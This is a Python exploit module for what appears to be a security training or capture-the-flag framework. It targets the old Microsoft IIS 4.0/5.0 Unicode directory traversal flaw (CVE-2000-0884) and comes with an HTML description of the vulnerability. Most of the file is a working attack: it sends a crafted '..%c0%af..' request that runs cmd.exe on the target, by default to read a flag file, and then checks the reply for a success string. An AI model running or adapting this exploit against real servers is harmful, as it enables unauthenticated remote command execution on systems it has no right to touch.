import interfaces.exploit as exploit
from interfaces.exploit import Exploit, ExploitError
from interfaces.hasparameters import StringParam
import managers.http as HTTP

description = ''' 
<br>
<hr><center><big><b>
IIS Directory Traversal
</b></big></center><hr>
<br>
<b>Vulnerability:</b><hr>		
Microsoft IIS and PWS Extended Unicode Directory Traversal Vulnerability
<br><br>
Microsoft IIS 4.0 and 5.0 are both vulnerable to double dot "../" 
directory traversal exploitation if extended UNICODE character
representations are used in substitution for "/" and "\".
<br><br>
Unauthenticated users may access any known file in the context of the
IUSR_machinename account. The IUSR_machinename account is a member of the
Everyone and Users groups by default, therefore, any file on the same logical
drive as any web-accessible file that is accessible to these groups can be
deleted, modified, or executed. Successful exploitation would yield the same
privileges as a user who could successfully log onto the system to a remote
user possessing no credentials whatsoever.
<br><br>
This is the vulnerability exploited by the Code Blue Worm. 	
<br><br>
<b>References</b><hr>
CVE-2000-0884<br>
Bugtraq 1806
<br>
<b>Attack Details</b><hr>
'''
	
class IISUnicodeTraversal(Exploit):

	def __init__(self):
		Exploit.__init__(self,'IIS Directory-Traversal', description)
		self.add_param(StringParam('CMD','/winnt/system32/cmd.exe?/c+type+c:\\flag.txt', 'The command to be executed during the attack'))
		self.add_param(StringParam('RESULT','OK','The string that must be present in the result if the attack is successful'))
		
		self.res = None 

	def execute(self):
		self.res = None
		http = HTTP.HttpManager()

		url = "/scripts/..%c0%af.."+self.CMD
		cmd = "GET "+url
				
		self.log.info("Sending %s"%cmd)
		
		req = HTTP.HttpRequest(cmd, header={'host':'none'})

		if(http.send_request(req) == False):
			self.log.error("Request failed")
			raise ExploitException, "Connection or request error"
		
		self.res = http.get_http_response()
		http.close()
		
		self.log.debug("RESULT: \r\n%s"%self.res)

	def isSuccessful(self):
		if self.RESULT in self.res.data:
			return exploit.RES_OK
		else:
			return exploit.RES_FAIL

		
